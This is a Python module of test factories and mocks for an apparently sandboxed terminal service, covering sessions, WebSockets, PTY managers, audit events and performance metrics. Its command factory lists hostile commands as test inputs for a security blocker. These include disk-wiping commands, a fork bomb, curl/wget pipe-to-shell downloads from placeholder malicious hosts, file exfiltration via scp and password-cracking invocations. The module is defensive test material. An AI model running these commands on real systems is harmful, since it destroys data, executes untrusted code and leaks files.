"""
Test Data Factories and Mocks for Terminal Sessions.
Provides factory functions and mock objects for consistent terminal testing.
"""

import asyncio
import json
import tempfile
import uuid
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, Any, List, Optional, Union
from unittest.mock import Mock, AsyncMock, MagicMock
import random
import string


class TerminalSessionFactory:
    """Factory for creating terminal session test data."""

    @staticmethod
    def create_session_id() -> str:
        """Generate a unique session ID."""
        return str(uuid.uuid4())

    @staticmethod
    def create_pty_session_id() -> str:
        """Generate a unique PTY session ID."""
        return f"pty-{uuid.uuid4()}"

    @staticmethod
    def create_user_id() -> str:
        """Generate a test user ID."""
        return f"test-user-{uuid.uuid4().hex[:8]}"

    @classmethod
    def create_session_data(cls, **kwargs) -> Dict[str, Any]:
        """Create session data dictionary."""
        defaults = {
            "session_id": cls.create_session_id(),
            "pty_session_id": cls.create_pty_session_id(),
            "user_id": cls.create_user_id(),
            "created_at": datetime.now().isoformat(),
            "last_activity": datetime.now().isoformat(),
            "is_active": True,
            "command_history": [],
            "sandbox_enabled": True,
            "security_level": "standard",
        }
        defaults.update(kwargs)
        return defaults

    @classmethod
    def create_multiple_sessions(cls, count: int = 5) -> List[Dict[str, Any]]:
        """Create multiple session data objects."""
        return [cls.create_session_data() for _ in range(count)]

    @classmethod
    def create_expired_session(cls, hours_ago: int = 2) -> Dict[str, Any]:
        """Create an expired session."""
        expired_time = datetime.now() - timedelta(hours=hours_ago)
        return cls.create_session_data(
            last_activity=expired_time.isoformat(), is_active=False
        )


class MockWebSocketFactory:
    """Factory for creating mock WebSocket objects."""

    @staticmethod
    def create_websocket(**kwargs) -> Mock:
        """Create a mock WebSocket."""
        mock_ws = AsyncMock()
        mock_ws.accept = AsyncMock()
        mock_ws.send_text = AsyncMock()
        mock_ws.send_json = AsyncMock()
        mock_ws.receive_text = AsyncMock()
        mock_ws.receive_json = AsyncMock()
        mock_ws.close = AsyncMock()
        mock_ws.client_state = "CONNECTED"

        # Add custom behavior
        for attr, value in kwargs.items():
            setattr(mock_ws, attr, value)

        return mock_ws

    @classmethod
    def create_failing_websocket(cls) -> Mock:
        """Create a WebSocket that fails operations."""
        mock_ws = cls.create_websocket()
        mock_ws.send_text.side_effect = ConnectionError("WebSocket closed")
        mock_ws.send_json.side_effect = ConnectionError("WebSocket closed")
        mock_ws.client_state = "CLOSED"
        return mock_ws

    @classmethod
    def create_slow_websocket(cls, delay: float = 0.1) -> Mock:
        """Create a WebSocket with artificial delays."""

        async def delayed_send(*args, **kwargs):
            await asyncio.sleep(delay)

        mock_ws = cls.create_websocket()
        mock_ws.send_text = AsyncMock(side_effect=delayed_send)
        mock_ws.send_json = AsyncMock(side_effect=delayed_send)
        return mock_ws


class TerminalCommandFactory:
    """Factory for creating terminal commands and responses."""

    SAFE_COMMANDS = [
        "ls -la",
        "pwd",
        "whoami",
        "echo 'Hello World'",
        "cat README.md",
        "grep -r 'pattern' .",
        "find . -name '*.py'",
        "python --version",
        "node --version",
        "git status",
        "git log --oneline",
        "docker ps",
        "kubectl get pods",
        "npm install",
        "yarn build",
        "pip list",
        "which python",
        "date",
        "history",
        "env | grep PATH",
    ]

    DANGEROUS_COMMANDS = [
        "rm -rf /",
        "sudo rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda",
        "chmod -R 777 /",
        ":(){ :|:& };:",  # Fork bomb
        "cat /dev/urandom > /dev/sda",
        "sudo shutdown -h now",
        "init 0",
        "halt",
        "reboot",
        "poweroff",
        "fdisk /dev/sda",
        "parted /dev/sda",
        "wipefs -a /dev/sda",
    ]

    SUSPICIOUS_COMMANDS = [
        "nc -l 4444",
        "wget http://malicious-site.com/script.sh | bash",
        "curl -s http://suspicious.com | sh",
        "ssh root@untrusted-host",
        "scp sensitive-file.txt user@external-host:",
        "nmap -sS target-host",
        "sqlmap -u 'http://target/vulnerable.php?id=1'",
        "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "hydra -l admin -P passwords.txt ssh://target",
        "base64 -d <<< 'encoded_payload' | bash",
    ]

    CASPER_COMMANDS = [
        ("task", ["Create a new API endpoint"]),
        ("task", ["Implement user authentication", "--priority", "high"]),
        ("status", []),
        ("analyze", ["Build a dashboard component"]),
        ("list", ["10"]),
        ("help", []),
        ("init", []),
        ("init", ["--project", "/tmp/test-project"]),
    ]

    @classmethod
    def create_safe_command(cls) -> str:
        """Get a random safe command."""
        return random.choice(cls.SAFE_COMMANDS)

    @classmethod
    def create_dangerous_command(cls) -> str:
        """Get a random dangerous command."""
        return random.choice(cls.DANGEROUS_COMMANDS)

    @classmethod
    def create_suspicious_command(cls) -> str:
        """Get a random suspicious command."""
        return random.choice(cls.SUSPICIOUS_COMMANDS)

    @classmethod
    def create_casper_command(cls) -> tuple:
        """Get a random CASPER command."""
        return random.choice(cls.CASPER_COMMANDS)

    @classmethod
    def create_command_batch(
        cls, count: int = 10, command_type: str = "safe"
    ) -> List[str]:
        """Create a batch of commands."""
        if command_type == "safe":
            source = cls.SAFE_COMMANDS
        elif command_type == "dangerous":
            source = cls.DANGEROUS_COMMANDS
        elif command_type == "suspicious":
            source = cls.SUSPICIOUS_COMMANDS
        else:
            source = cls.SAFE_COMMANDS + cls.DANGEROUS_COMMANDS

        return [random.choice(source) for _ in range(count)]

    @staticmethod
    def create_command_output(command: str, success: bool = True) -> str:
        """Create realistic command output."""
        if not success:
            return f"bash: {command.split()[0]}: command not found"

        # Generate realistic output based on command
        if command.startswith("ls"):
            return "total 64\ndrwxr-xr-x  12 user user 4096 Jan 15 10:30 .\ndrwxr-xr-x   3 user user 4096 Jan 14 09:15 ..\n-rw-r--r--   1 user user  220 Jan 14 09:15 .bash_logout"

        elif command.startswith("pwd"):
            return "/home/user/projects/casper-dev"

        elif command.startswith("whoami"):
            return "user"

        elif command.startswith("echo"):
            # Extract the echo content
            parts = command.split("'")
            if len(parts) > 1:
                return parts[1]
            return command.replace("echo ", "")

        elif command.startswith("date"):
            return datetime.now().strftime("%a %b %d %H:%M:%S %Z %Y")

        elif command.startswith("python --version"):
            return "Python 3.11.5"

        elif command.startswith("git status"):
            return "On branch main\nnothing to commit, working tree clean"

        else:
            return f"Output for command: {command}"


class SecurityEventFactory:
    """Factory for creating security audit events."""

    EVENT_TYPES = [
        "COMMAND_EXECUTED",
        "COMMAND_BLOCKED",
        "SECURITY_VIOLATION",
        "SESSION_CREATED",
        "SESSION_TERMINATED",
        "AUTHENTICATION_SUCCESS",
        "AUTHENTICATION_FAILURE",
        "RATE_LIMIT_EXCEEDED",
        "SANDBOX_CREATED",
        "SANDBOX_CLEANUP",
    ]

    RISK_LEVELS = ["low", "medium", "high", "critical"]

    @classmethod
    def create_audit_event(cls, **kwargs) -> Dict[str, Any]:
        """Create a security audit event."""
        defaults = {
            "event_type": random.choice(cls.EVENT_TYPES),
            "command": TerminalCommandFactory.create_safe_command(),
            "session_id": TerminalSessionFactory.create_session_id(),
            "user_id": TerminalSessionFactory.create_user_id(),
            "risk_level": random.choice(cls.RISK_LEVELS),
            "allowed": random.choice([True, False]),
            "reason": "Test security event",
            "timestamp": datetime.now().isoformat(),
            "ip_address": cls._generate_ip_address(),
            "user_agent": "CASPER-Terminal/1.0",
        }
        defaults.update(kwargs)
        return defaults

    @classmethod
    def create_security_violation(cls, command: str = None) -> Dict[str, Any]:
        """Create a security violation event."""
        return cls.create_audit_event(
            event_type="SECURITY_VIOLATION",
            command=command or TerminalCommandFactory.create_dangerous_command(),
            risk_level="high",
            allowed=False,
            reason="Command blocked by security policy",
        )

    @classmethod
    def create_successful_execution(cls, command: str = None) -> Dict[str, Any]:
        """Create a successful command execution event."""
        return cls.create_audit_event(
            event_type="COMMAND_EXECUTED",
            command=command or TerminalCommandFactory.create_safe_command(),
            risk_level="low",
            allowed=True,
            reason="Command executed successfully",
        )

    @classmethod
    def create_event_batch(
        cls, count: int = 50, hours_span: int = 24
    ) -> List[Dict[str, Any]]:
        """Create a batch of audit events over time."""
        events = []
        start_time = datetime.now() - timedelta(hours=hours_span)

        for i in range(count):
            # Distribute events over time
            event_time = start_time + timedelta(hours=random.uniform(0, hours_span))

            event = cls.create_audit_event(timestamp=event_time.isoformat())
            events.append(event)

        return sorted(events, key=lambda x: x["timestamp"])

    @staticmethod
    def _generate_ip_address() -> str:
        """Generate a fake IP address."""
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"


class PerformanceDataFactory:
    """Factory for creating performance test data."""

    @staticmethod
    def create_performance_metric(
        name: str,
        value: float,
        unit: str,
        threshold: float = None,
        description: str = "",
    ) -> Dict[str, Any]:
        """Create a performance metric."""
        return {
            "name": name,
            "value": value,
            "unit": unit,
            "threshold": threshold or value * 1.2,
            "description": description,
            "timestamp": datetime.now().isoformat(),
            "passed": threshold is None or value <= threshold,
        }

    @classmethod
    def create_latency_metrics(cls, count: int = 100) -> List[Dict[str, Any]]:
        """Create latency performance metrics."""
        metrics = []
        for i in range(count):
            # Simulate realistic latency values (1-100ms with some outliers)
            if random.random() < 0.05:  # 5% outliers
                latency = random.uniform(100, 500)
            else:
                latency = random.uniform(1, 100)

            metrics.append(
                cls.create_performance_metric(
                    name=f"command_latency_{i}",
                    value=latency,
                    unit="ms",
                    threshold=200,
                    description=f"Command execution latency test {i}",
                )
            )

        return metrics

    @classmethod
    def create_throughput_metrics(
        cls, operations: int = 1000, duration: float = 10.0
    ) -> Dict[str, Any]:
        """Create throughput metrics."""
        throughput = operations / duration
        return cls.create_performance_metric(
            name="terminal_throughput",
            value=throughput,
            unit="ops/s",
            threshold=50,
            description=f"Terminal throughput: {operations} operations in {duration}s",
        )

    @classmethod
    def create_memory_metrics(cls, sessions: int = 10) -> Dict[str, Any]:
        """Create memory usage metrics."""
        # Simulate memory usage per session (5-50MB per session)
        memory_per_session = random.uniform(5, 50)
        total_memory = memory_per_session * sessions

        return cls.create_performance_metric(
            name="memory_usage",
            value=total_memory,
            unit="MB",
            threshold=500,  # 500MB threshold
            description=f"Memory usage for {sessions} terminal sessions",
        )


class MockPTYManagerFactory:
    """Factory for creating mock PTY managers."""

    @staticmethod
    def create_mock_pty_manager(**kwargs) -> Mock:
        """Create a mock PTY manager."""
        mock_manager = AsyncMock()

        # Default session data
        default_sessions = {
            "session-1": {
                "session_id": "session-1",
                "is_active": True,
                "last_activity": datetime.now().timestamp(),
                "process_pid": 12345,
            }
        }

        # Configure mock methods
        mock_manager.sessions = kwargs.get("sessions", default_sessions)
        mock_manager.start = AsyncMock()
        mock_manager.stop = AsyncMock()
        mock_manager.create_session = AsyncMock(return_value="new-session-id")
        mock_manager.close_session = AsyncMock(return_value=True)
        mock_manager.write_to_session = AsyncMock(return_value=True)
        mock_manager.resize_session = AsyncMock(return_value=True)
        mock_manager.set_output_callback = Mock(return_value=True)
        mock_manager.get_session_info = Mock(return_value=default_sessions["session-1"])
        mock_manager.list_sessions = Mock(return_value=list(default_sessions.values()))

        # Apply custom overrides
        for attr, value in kwargs.items():
            if attr != "sessions":
                setattr(mock_manager, attr, value)

        return mock_manager

    @classmethod
    def create_failing_pty_manager(cls) -> Mock:
        """Create a PTY manager that fails operations."""
        mock_manager = cls.create_mock_pty_manager()
        mock_manager.create_session.side_effect = OSError("PTY creation failed")
        mock_manager.write_to_session.return_value = False
        mock_manager.resize_session.return_value = False
        return mock_manager

    @classmethod
    def create_slow_pty_manager(cls, delay: float = 0.1) -> Mock:
        """Create a PTY manager with artificial delays."""

        async def delayed_operation(*args, **kwargs):
            await asyncio.sleep(delay)
            return True

        mock_manager = cls.create_mock_pty_manager()
        mock_manager.create_session = AsyncMock(side_effect=delayed_operation)
        mock_manager.write_to_session = AsyncMock(side_effect=delayed_operation)
        return mock_manager


class SandboxFactory:
    """Factory for creating test sandbox environments."""

    @staticmethod
    def create_temp_sandbox() -> Dict[str, Any]:
        """Create a temporary sandbox directory."""
        sandbox_dir = Path(tempfile.mkdtemp(prefix="casper_test_sandbox_"))

        # Create basic sandbox structure
        (sandbox_dir / "home").mkdir()
        (sandbox_dir / "tmp").mkdir()
        (sandbox_dir / "bin").mkdir()

        return {
            "sandbox_dir": str(sandbox_dir),
            "env_vars": {
                "HOME": str(sandbox_dir / "home"),
                "PATH": str(sandbox_dir / "bin") + ":/usr/bin:/bin",
                "TERM": "xterm-256color",
                "CASPER_SANDBOX": "true",
                "TMPDIR": str(sandbox_dir / "tmp"),
            },
            "restrictions": {
                "network": False,
                "filesystem": True,
                "max_memory": "100M",
                "max_cpu": "50%",
            },
        }

    @classmethod
    def create_sandbox_batch(cls, count: int = 5) -> List[Dict[str, Any]]:
        """Create multiple sandbox environments."""
        return [cls.create_temp_sandbox() for _ in range(count)]


class WebSocketMessageFactory:
    """Factory for creating WebSocket messages."""

    MESSAGE_TYPES = [
        "connection",
        "command",
        "input",
        "output",
        "resize",
        "ping",
        "pong",
        "error",
        "casper_command",
        "security_event",
        "session_created",
        "session_closed",
    ]

    @classmethod
    def create_message(cls, message_type: str, **data) -> Dict[str, Any]:
        """Create a WebSocket message."""
        base_message = {"type": message_type, "timestamp": datetime.now().isoformat()}
        base_message.update(data)
        return base_message

    @classmethod
    def create_command_message(cls, command: str) -> Dict[str, Any]:
        """Create a command execution message."""
        return cls.create_message("command", command=command)

    @classmethod
    def create_input_message(cls, data: str) -> Dict[str, Any]:
        """Create a terminal input message."""
        return cls.create_message("input", data=data)

    @classmethod
    def create_output_message(cls, data: str, session_id: str = None) -> Dict[str, Any]:
        """Create a terminal output message."""
        return cls.create_message(
            "output",
            data=data,
            session_id=session_id or TerminalSessionFactory.create_session_id(),
        )

    @classmethod
    def create_resize_message(cls, rows: int = 24, cols: int = 80) -> Dict[str, Any]:
        """Create a terminal resize message."""
        return cls.create_message("resize", rows=rows, cols=cols)

    @classmethod
    def create_error_message(cls, error_type: str, message: str) -> Dict[str, Any]:
        """Create an error message."""
        return cls.create_message("error", error_type=error_type, message=message)

    @classmethod
    def create_casper_command_message(
        cls, command: str, args: List[str] = None
    ) -> Dict[str, Any]:
        """Create a CASPER command message."""
        return cls.create_message("casper_command", command=command, args=args or [])

    @classmethod
    def create_message_batch(cls, count: int = 20) -> List[Dict[str, Any]]:
        """Create a batch of various WebSocket messages."""
        messages = []
        commands = TerminalCommandFactory.SAFE_COMMANDS

        for i in range(count):
            if i % 5 == 0:
                messages.append(cls.create_ping_message())
            elif i % 5 == 1:
                messages.append(cls.create_command_message(random.choice(commands)))
            elif i % 5 == 2:
                messages.append(cls.create_input_message(f"test input {i}\n"))
            elif i % 5 == 3:
                messages.append(cls.create_resize_message(24 + i % 10, 80 + i % 20))
            else:
                casper_cmd, casper_args = TerminalCommandFactory.create_casper_command()
                messages.append(
                    cls.create_casper_command_message(casper_cmd, casper_args)
                )

        return messages

    @classmethod
    def create_ping_message(cls) -> Dict[str, Any]:
        """Create a ping message."""
        return cls.create_message("ping")

    @classmethod
    def create_pong_message(cls) -> Dict[str, Any]:
        """Create a pong message."""
        return cls.create_message("pong")


# Utility functions for test data generation
def generate_random_string(length: int = 10) -> str:
    """Generate a random string."""
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def generate_test_file_content(file_type: str = "python") -> str:
    """Generate test file content based on type."""
    if file_type == "python":
        return '''#!/usr/bin/env python3
"""Test Python file."""

def hello_world():
    print("Hello, World!")

if __name__ == "__main__":
    hello_world()
'''
    elif file_type == "javascript":
        return """// Test JavaScript file
function helloWorld() {
    console.log("Hello, World!");
}

helloWorld();
"""
    elif file_type == "json":
        return json.dumps(
            {
                "name": "test-project",
                "version": "1.0.0",
                "description": "Test project for CASPER terminal",
                "scripts": {"test": "echo 'test'", "start": "node index.js"},
            },
            indent=2,
        )
    else:
        return f"Test content for {file_type} file"


def create_test_workspace(base_path: Path) -> Dict[str, Any]:
    """Create a complete test workspace."""
    workspace = {"path": str(base_path), "files": {}, "directories": []}

    # Create directory structure
    directories = ["src", "tests", "docs", ".git", "node_modules", ".casper"]

    for directory in directories:
        dir_path = base_path / directory
        dir_path.mkdir(exist_ok=True)
        workspace["directories"].append(str(dir_path))

    # Create test files
    files = {
        "package.json": generate_test_file_content("json"),
        "README.md": "# Test Project\n\nThis is a test project for CASPER terminal testing.",
        "src/main.py": generate_test_file_content("python"),
        "src/index.js": generate_test_file_content("javascript"),
        "tests/test_main.py": "import unittest\n\nclass TestMain(unittest.TestCase):\n    def test_example(self):\n        self.assertTrue(True)",
        ".gitignore": "node_modules/\n*.pyc\n__pycache__/\n.pytest_cache/",
    }

    for file_path, content in files.items():
        full_path = base_path / file_path
        full_path.parent.mkdir(parents=True, exist_ok=True)
        full_path.write_text(content)
        workspace["files"][file_path] = str(full_path)

    return workspace


# Export all factories and utilities
__all__ = [
    "TerminalSessionFactory",
    "MockWebSocketFactory",
    "TerminalCommandFactory",
    "SecurityEventFactory",
    "PerformanceDataFactory",
    "MockPTYManagerFactory",
    "SandboxFactory",
    "WebSocketMessageFactory",
    "generate_random_string",
    "generate_test_file_content",
    "create_test_workspace",
]
